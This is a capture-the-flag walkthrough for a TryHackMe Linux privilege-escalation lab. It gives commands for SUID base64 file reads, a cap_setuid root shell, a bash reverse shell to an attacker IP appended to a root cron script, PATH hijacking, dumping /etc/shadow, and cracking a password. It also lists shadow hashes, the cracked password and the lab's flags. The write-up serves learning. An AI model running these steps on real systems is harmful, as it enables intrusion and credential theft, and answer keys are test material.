# Walkthrough : TryhackMe - Linux Privilege Escalation

This comprehensive documentation covers every phase, command, and vulnerability exploited across all lab targets shown in your terminal sessions.

## Part 1: Initial Target Reconnaissance & Initial Privilege Escalation
### Phase 1: File Read Exfiltration via Base64 SUID Binary (Flag 3)
The binary ```/usr/bin/base64``` has the SUID (Set User ID) bit set. This allows an unprivileged user to execute the binary with the file read permissions of the file owner (```root```).

1. Set the Target File Variable:
```bash
LFILE=/home/ubuntu/flag3.txt
```
Explanation: Creates an environment variable pointing to the target file that is normally unreadable by standard users.

2. Exfiltrate and Decode File Contents:
```bash
/usr/bin/base64 "$LFILE" | base64 --decode
```
Explanation: Reads ```/home/ubuntu/flag3.txt``` using root-privileged ```base64```, encodes the file stream, and pipes it back into standard ```base64 --decode``` to print the plaintext content.
 - Retrieved Flag 3: ```THM-3847834```

### Phase 2: Exploiting Linux Capabilities via view (Flag 4)
Linux capabilities grant fine-grained privileges to binaries. The binary ```/home/ubuntu/view``` was configured with ```cap_setuid+ep```, enabling it to manipulate process User IDs.
1. Launch the Vulnerable Binary:
```bash
/home/ubuntu/view
```
Explanation: Opens the ```view``` text editor while keeping the ```cap_setuid``` capability active in the process context.

2. Execute Python API to Spawn a Root Shell:
Press : inside ```view``` and enter:
```bash
:py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```
Explanation:
  - ```import os```: Imports Python's OS interface module.
  - ```os.setuid(0)```: Leverages ```cap_setuid``` to set the real and effective User ID to ```0``` (```root```).
  - ```os.execl(...)```: Replaces the running process with an interactive ```/bin/sh``` shell running as root.

3. Read Flag 4:
```bash
cat /home/ubuntu/flag4.txt
```
Explanation: Reads the root-owned flag file directly from the newly spawned root shell.

- Retrieved Flag 4: ```THM-9349843```

### Phase 3: Root Cron Job Hijacking (Flag 5)
A root-level cron job continuously executes ```/home/karen/backup.sh```. Because the script file is writable by the user ```karen```, modifying its content leads to arbitrary command execution as ```root```.
1. Inject Reverse Shell Payload:
```bash
echo "bash -i >& /dev/tcp/192.168.135.130/8080 0>&1" >> /home/karen/backup.sh
```
Explanation: Appends an interactive Bash reverse shell command targeting the attacker listener IP (```192.168.135.130```) on port ```8080```.
2. Grant Execution Rights:
```bash
chmod +x /home/karen/backup.sh
```
Explanation: Sets executable permissions on the file so the system cron daemon executes it without permission failures.

3. Catch Netcat Reverse Shell:
On the attacker terminal:
```bash
nc -lvnp 8080
```
Explanation: Listens for incoming socket connections on port ```8080```. Once cron runs ```backup.sh```, a root shell is established.

4. Read Flag 5:
```bash
cat /home/ubuntu/flag5.txt
```
Explanation: Displays the root-protected flag.

- Retrieved Flag 5: ```THM-383000283```

### Phase 4: Environmental PATH Hijacking via /home/murdoch/test
The directory ```/home/murdoch``` contains a SUID root binary named ```test``` alongside a script ```thm.py```.

1. Inspect Python Source Code (thm.py):
```bash
nano thm.py
```
Explanation: The code executes ```os.system("thm")```. Because ```thm``` is called relatively rather than using an absolute path ```(/usr/bin/thm)```, the shell searches directories defined in the ```$PATH``` environment variable in order.

2. Prepend /tmp to System PATH:
```bash
export PATH=/tmp:$PATH
```
Explanation: Modifies ```$PATH``` so the operating system checks ```/tmp``` first when executing command names.

3. Create Malicious Executable in ```/tmp```:
```bash
echo "/bin/bash" > /tmp/thm
chmod 777 /tmp/thm
```
Explanation: Creates a script named ```thm``` inside ```/tmp``` that launches ```/bin/bash``` and sets full read/write/execute permissions for everyone.

4. Trigger SUID Execution:
```bash
./test
```
Explanation: Executes ```./test```, which calls ```thm.py``` under SUID root permissions. Because of PATH manipulation, the system executes ```/tmp/thm``` instead of any binary, granting an immediate root shell (```root@ip-10-49-191-189```).

## Part 2: Target Machine leonard@ip-10-48-165-75 Exploitation
## Phase 1: SUID Identification & Dumping /etc/shadow
1. Locate System SUID Binaries:
```bash
find / -type f -perm -4000 2>/dev/null
```
Explanation: Searches the filesystem for files owned by root with the SUID bit enabled (```-perm -4000```), identifying ```/usr/bin/base64```.

2. Exfiltrate Password Shadow File:
```bash
LFILE=/etc/shadow
/usr/bin/base64 "$LFILE" | base64 --decode
```
Explanation: Uses the ```/usr/bin/base64``` SUID binary to bypass read restrictions on ```/etc/shadow``` and dump password hashes to the screen.

Extracted SHA-512 Hashes:
  - root: $6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmADD9oGUSxe1yvKbnYsaSYHrUEQXTJiW0W/yrzV5HtIL51
  - leonard: $6$JELumeiiJFPMfJ3X$0XKY.N8LDHHtTF5Q/pTCsWbZt06SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/
  - missy: $6$BjoLWE21$HwuDVV1iSiySCNpA3Z9LxkxQEqUADZvObTxJxMoCp/9zRVCi6/zrlMLAQPAtfwad2JCUypk4HaNZi3RpVQKHb/

### Phase 2: Password Cracking & Lateral Movement to User missy
1. Format Hash File on Attacker Machine:
```bash
vim missy
cat missy
```
Explanation: Creates a file named ```missy``` containing the SHA-512 hash string extracted from ```/etc/shadow```.

2. Crack Hash via John the Ripper:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt missy
```
Explanation: Runs John the Ripper using the ```rockyou.txt``` wordlist to perform a dictionary attack against ```missy's``` hash.
- Result: Plaintext password recovered: ```Password1```.

3. Switch User Session:
```bash
su missy
```
Explanation: Switches from user ```leonard``` to user ```missy``` using the credentials ```missy:Password1```.

### Phase 3: Retrieving Flag 1 & Flag 2
1. Read User Flag (Flag 1):
```bash
cd Documents
cat flag1.txt
```
Explanation: Navigates to ```missy's Documents``` folder and reads the user flag file.
- Retrieved Flag 1: ```THM-42828719920544```

2. Exfiltrate Restricted Root Flag (Flag 2):
```bash
LFILE=/home/rootflag/flag2.txt
/usr/bin/base64 "$LFILE" | base64 --decode
```
Explanation: Uses ```/usr/bin/base64``` SUID permissions from ```missy's``` shell session to bypass directory permissions on ```/home/rootflag/``` and read ```flag2.txt```.
- Retrieved Flag 2: ```THM-168824782390238```

## Final Artifacts Summary
  - Flag 1: THM-42828719920544
  - Flag 2: THM-168824782390238
  - Flag 3: THM-3847834
  - Flag 4: THM-9349843
  - Flag 5: THM-383000283
  - User Credentials Cracked: missy : Password1
